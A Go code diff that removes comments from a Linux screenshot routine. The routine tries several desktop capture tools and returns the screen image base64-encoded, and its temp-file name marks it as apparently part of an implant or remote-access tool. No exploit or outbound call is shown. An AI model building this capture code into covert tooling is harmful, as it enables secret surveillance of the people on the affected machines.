@@ -19,45 +19,44 @@ func init() {
 type linuxScreenshotUtility struct {
 	name         string
 	cmd          string
-	argsToStdout []string // Arguments to make the tool print PNG image data to stdout.
-	argsToFile   []string // Arguments to make the tool save to a file. Filename will be appended.
+	argsToStdout []string
+	argsToFile   []string
 }
 
 var linuxScreenshotUtilities = []linuxScreenshotUtility{
 	{
 		name:         "grim (Wayland)",
 		cmd:          "grim",
-		argsToStdout: []string{"-t", "png", "-"}, // Output PNG to stdout
+		argsToStdout: []string{"-t", "png", "-"},
 	},
 	{
 		name:         "maim (X11)",
 		cmd:          "maim",
-		argsToStdout: []string{"-f", "png"}, // Output PNG to stdout by default, -f png for explicit format
+		argsToStdout: []string{"-f", "png"},
 	},
 	{
 		name:         "import (ImageMagick, X11)",
 		cmd:          "import",
-		argsToStdout: []string{"-window", "root", "png:-"}, // Capture root window, output PNG to stdout
-		argsToFile:   []string{"-window", "root"},          // Filename will be appended by the function
+		argsToStdout: []string{"-window", "root", "png:-"},
+		argsToFile:   []string{"-window", "root"},
 	},
 	{
 		name: "scrot (X11)",
 		cmd:  "scrot",
-		// Attempt to output to stdout. Some versions might support this.
-		// -o: overwrite, -z: silent (no beep/countdown)
+
 		argsToStdout: []string{"-o", "-z", "/dev/stdout"},
-		// Fallback: save to a temporary file.
-		argsToFile: []string{"-o", "-z"}, // Filename will be appended
+
+		argsToFile: []string{"-o", "-z"},
 	},
 	{
 		name:       "gnome-screenshot (GNOME Session)",
 		cmd:        "gnome-screenshot",
-		argsToFile: []string{"-f"}, // -f <filename>. Filename will be appended.
+		argsToFile: []string{"-f"},
 	},
 	{
 		name:       "spectacle (KDE Session)",
 		cmd:        "spectacle",
-		argsToFile: []string{"--fullscreen", "--batch", "--output"}, // --output <filename>. Filename will be appended.
+		argsToFile: []string{"--fullscreen", "--batch", "--output"},
 	},
 }
 
@@ -67,27 +66,25 @@ func linuxTakeScreenshot() (string, error) {
 	for _, util := range linuxScreenshotUtilities {
 		cmdPath, err := exec.LookPath(util.cmd)
 		if err != nil {
-			// Utility not found, record error and try next
+
 			lastErr = fmt.Errorf("utility %s not found in PATH: %w", util.cmd, err)
 			continue
 		}
 
-		// Attempt 1: Capture to stdout if argsToStdout are defined
 		if len(util.argsToStdout) > 0 {
 			cmd := exec.Command(cmdPath, util.argsToStdout...)
 			var outBuffer bytes.Buffer
 			var errBuffer bytes.Buffer
 			cmd.Stdout = &outBuffer
 			cmd.Stderr = &errBuffer
-			cmd.Env = os.Environ() // Inherit environment (important for DISPLAY, WAYLAND_DISPLAY, DBUS_SESSION_BUS_ADDRESS)
+			cmd.Env = os.Environ()
 
 			err := cmd.Run()
 			if err == nil && outBuffer.Len() > 0 {
-				// Success
+
 				return base64.StdEncoding.EncodeToString(outBuffer.Bytes()), nil
 			}
 
-			// Record error for this attempt
 			errMsg := ""
 			if err != nil {
 				errMsg = err.Error()
@@ -96,42 +93,40 @@ func linuxTakeScreenshot() (string, error) {
 			if stderrStr != "" {
 				errMsg = fmt.Sprintf("%s (stderr: %s)", errMsg, stderrStr)
 			}
-			if err != nil { // Command execution failed
+			if err != nil {
 				lastErr = fmt.Errorf("failed executing %s (stdout method): %s", util.name, errMsg)
-			} else if outBuffer.Len() == 0 { // Command ran but produced no output
+			} else if outBuffer.Len() == 0 {
 				lastErr = fmt.Errorf("%s (stdout method) produced no output; %s", util.name, errMsg)
 			}
-			// Continue to next method or utility
+
 		}
 
-		// Attempt 2: Capture to a temporary file if argsToFile are defined
 		if len(util.argsToFile) > 0 {
 			tmpFile, err := os.CreateTemp("", "implant-screenshot-*.png")
 			if err != nil {
 				lastErr = fmt.Errorf("failed to create temp file for %s: %w", util.name, err)
-				continue // Try next utility or method
+				continue
 			}
 			tmpFileName := tmpFile.Name()
-			tmpFile.Close() // Close the file handle, command will write to the path
+			tmpFile.Close()
 
-			// Ensure temporary file is cleaned up
 			defer func(path string) { os.Remove(path) }(tmpFileName)
 
 			fullArgs := append(util.argsToFile, tmpFileName)
 			cmd := exec.Command(cmdPath, fullArgs...)
 			var errBuffer bytes.Buffer
 			cmd.Stderr = &errBuffer
-			cmd.Env = os.Environ() // Inherit environment
+			cmd.Env = os.Environ()
 
 			err = cmd.Run()
 			if err == nil {
 				imgBytes, readErr := os.ReadFile(tmpFileName)
 				if readErr != nil {
 					lastErr = fmt.Errorf("failed to read temp screenshot file %s for %s: %w", tmpFileName, util.name, readErr)
-					os.Remove(tmpFileName) // Clean up now
+					os.Remove(tmpFileName)
 					continue
 				}
-				os.Remove(tmpFileName) // Clean up now
+				os.Remove(tmpFileName)
 				if len(imgBytes) > 0 {
 					return base64.StdEncoding.EncodeToString(imgBytes), nil
 				}
@@ -139,14 +134,13 @@ func linuxTakeScreenshot() (string, error) {
 				continue
 			}
 
-			// Record error for this attempt
 			errMsg := err.Error()
 			stderrStr := strings.TrimSpace(errBuffer.String())
 			if stderrStr != "" {
 				errMsg = fmt.Sprintf("%s (stderr: %s)", errMsg, stderrStr)
 			}
 			lastErr = fmt.Errorf("failed executing %s (file method): %s", util.name, errMsg)
-			os.Remove(tmpFileName) // Clean up now on error
+			os.Remove(tmpFileName)
 		}
 	}
 
